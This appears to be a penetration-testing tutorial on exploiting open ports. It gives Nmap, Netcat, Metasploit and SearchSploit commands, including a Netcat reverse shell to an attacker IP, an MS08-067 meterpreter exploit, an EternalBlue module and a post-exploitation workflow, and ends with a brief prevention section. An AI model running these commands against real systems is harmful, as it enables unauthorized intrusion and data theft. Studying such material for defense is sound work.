System Hacking Using Open Ports
Open ports on a system can provide a pathway for attackers to gain unauthorized access. Hackers use tools like Nmap, Netcat, Metasploit (MSF), Armitage, and Exploit DB to discover and exploit vulnerabilities associated with open ports and their associated services.

Key Tools and Their Usage
1. Nmap (Network Mapper)
Nmap is a powerful tool for network discovery and vulnerability assessment. It identifies open ports, running services, and potential vulnerabilities.

Scan Open Ports:

bash
Copy code
nmap -p 1-65535 <target-IP>
Service and Version Detection:

bash
Copy code
nmap -sV -p <port> <target-IP>
Script Scanning (using Nmap Scripting Engine - NSE):

bash
Copy code
nmap --script vuln <target-IP>
Common Open Ports:

21 (FTP)
22 (SSH)
23 (Telnet)
25 (SMTP)
80/443 (HTTP/HTTPS)
445 (SMB)
3306 (MySQL)
2. Netcat (NC)
Netcat is a versatile networking tool for port scanning, service interaction, and creating backdoors.

Scan Open Ports:

bash
Copy code
nc -zv <target-IP> <start-port>-<end-port>
Banner Grabbing (to identify services running on open ports):

bash
Copy code
nc <target-IP> <port>
Establish Reverse Shell: On Attacker:

bash
Copy code
nc -lvp <port>
On Target:

bash
Copy code
nc <attacker-IP> <port> -e /bin/bash
3. Metasploit Framework (MSF)
Metasploit is a robust framework for finding and exploiting vulnerabilities in systems.

Scan for Open Ports: Use auxiliary modules to scan ports:

bash
Copy code
use auxiliary/scanner/portscan/tcp
set RHOSTS <target-IP>
run
Exploit Open Port Vulnerabilities: Search for exploits:

bash
Copy code
search <service-name>
Example Exploit:

bash
Copy code
use exploit/windows/smb/ms08_067_netapi
set RHOST <target-IP>
set PAYLOAD windows/meterpreter/reverse_tcp
set LHOST <attacker-IP>
run
4. Armitage
Armitage is a GUI front-end for Metasploit, simplifying the exploitation process.

Discover Open Ports: Use the built-in port scanning feature.

Automated Exploits:

After scanning, Armitage suggests exploits for identified vulnerabilities.
Launch exploits directly from the GUI.
5. Exploit DB
Exploit DB is a repository of publicly disclosed exploits. It is useful for finding vulnerabilities associated with specific services running on open ports.

Search for Vulnerabilities: Visit Exploit DB or use SearchSploit:

bash
Copy code
searchsploit <service-name or CVE>
Example: Exploit for FTP service running on port 21:

bash
Copy code
searchsploit vsftpd
Common Exploits Based on Open Ports
Port 21 (FTP):

Vulnerability: Anonymous login enabled.
Exploit: Upload malicious files or scripts.
Tool: Metasploitâ€™s ftp_login auxiliary module.
Port 22 (SSH):

Vulnerability: Weak credentials.
Exploit: Bruteforce using tools like Hydra or Metasploit.
Port 23 (Telnet):

Vulnerability: No encryption.
Exploit: Capture credentials using a man-in-the-middle attack.
Port 445 (SMB):

Vulnerability: SMBv1 (EternalBlue exploit).
Exploit: Use MSF module exploit/windows/smb/ms17_010_eternalblue.
Port 3306 (MySQL):

Vulnerability: Default credentials.
Exploit: Access the database and extract sensitive data.
System Hacking Workflow
Reconnaissance:

Use Nmap to identify open ports and services.
Perform banner grabbing with Netcat.
Vulnerability Scanning:

Run vulnerability scans using Nmap NSE or tools like Nessus.
Exploit Discovery:

Use Exploit DB or Metasploit to find exploits.
Launch Exploits:

Exploit vulnerabilities using Metasploit or manually with tools like Netcat.
Post-Exploitation:

Maintain access using backdoors or reverse shells.
Escalate privileges and gather sensitive information.
Preventing Open Port Exploitation
Close Unnecessary Ports: Use a firewall to block unused ports.

Use Strong Passwords: Prevent brute-force attacks by enforcing complex passwords.

Update and Patch: Keep systems and software up-to-date to mitigate vulnerabilities.

Intrusion Detection Systems (IDS): Monitor and alert suspicious activities.

Regular Audits: Periodically scan your systems for open ports and vulnerabilities.
